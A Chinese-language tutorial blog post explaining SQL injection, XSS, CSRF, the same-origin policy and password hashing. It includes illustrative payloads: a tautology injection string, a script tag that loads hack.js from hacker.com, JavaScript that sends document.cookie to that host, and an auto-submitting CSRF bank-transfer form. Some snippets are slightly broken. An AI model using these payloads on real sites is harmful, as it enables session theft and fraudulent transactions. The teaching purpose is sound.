---
title: Web安全
date: 2019-02-16 17:57:46
category: Basic
---
互联网本来是安全的，自从有了研究安全的人之后，互联网就变得不安全了。

<br/>
### 1. sql注入
通过把sql命令插入到web表单提交，或输入域名/页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令。

变量id是一个从用户界面传来的值
```sql
string sql = " SELECT id, name, age from users WHERE id='" + id + "'"
```
ID值: *`1' OR '1' = '1`*
```sql
SELECT id, name, age
FROM users
WHERE id='1' OR '1' = '1'
```
从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。
<br/>



### 2. XSS跨站脚本攻击
黑客通过"HTML注入"篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。

某个黑客发表了一篇文章，在`<input>`框中输入一段script
```js
<script type="text/javascript" src="http://hacker.com/hack.js"></script>
```


hack.js文件中的内容
```js
var img = document.createElement('img');
img.src = "http://hacker.com/log?" + escape(document.cookie);
document.body.appendChild(script);
```

一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。

<br/>


### 3. CSRF跨站脚本伪造
假设有个银行网站用以下方式进行转账操作
```
http://www.bank.com/transfer.php?toBankId=<账号>&money=<金额>
```
你打开浏览器，先登录了银行网站，然后又开了一个tab页，打开了你的邮箱，有这么一个邮件：恭喜你获得了一台iphone x,点击领取。点击了上面的链接，就执行了转账操作。

后来银行转账功能不用`get`， 改用`post`。 

黑客也做了改进，建立了一个偷偷提交数据的页面。用户进入该页面，会自动提交表单。若用户已经登录了`www.bank.com`，请求成功。

从头到尾，攻击网站都没有获取到过cookie， 都是通过浏览器间接实现（利用web的cookie隐式身份验证机制），所以`httpOnly`并不会影响这个攻击。

```html
<body>
  <iframe name="steal" display:'none'>
    <form method="POST" name="transfer" action="http://www.bank.com/transfer.php">
      <input type="hidden" name="toBankId" value="123">
      <input type="hidden" name="money" value="10000">
    </form>
  </iframe>
  <script>
    function steal(){
      iframe = document.frames["steal"];
      iframe.document.submit("transfer");
    }
  </script>
</body>
```


#### 3.1 解决方案
- 检查referer: 根据地址判断是否接受请求
- 添加csrf token: 在cookie中写入一个随机生成的csrf token, 用户请求时把csrf token带上。



<br/>

### 4. 同源策略
只能通过`<script><image><iframe><link>`等标签跨域加载资源。
<br/>

### 5. 密码hash
原始密码经过哈希函数计算得到一个哈希值，同样的密码，哈希值是相同的。哈希函数是单向，不可逆的，也就是从哈希值，你无法推算出原始密码是多少。
<br/>

<br/>
### 参考资料
- [简单的 web 安全 checklist](https://cloud.tencent.com/developer/article/1004895)
- 码农翻身-web安全
- 《图解HTTP》第11章 Web的攻击技术